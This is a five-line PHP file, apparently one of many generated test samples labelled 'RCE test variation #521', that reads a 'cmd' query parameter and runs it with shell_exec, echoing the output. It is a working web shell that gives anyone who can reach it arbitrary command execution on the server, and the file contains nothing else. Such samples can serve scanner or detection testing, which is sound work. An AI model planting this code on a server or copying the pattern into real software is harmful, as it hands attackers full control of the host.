<?php
// RCE test variation #521
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>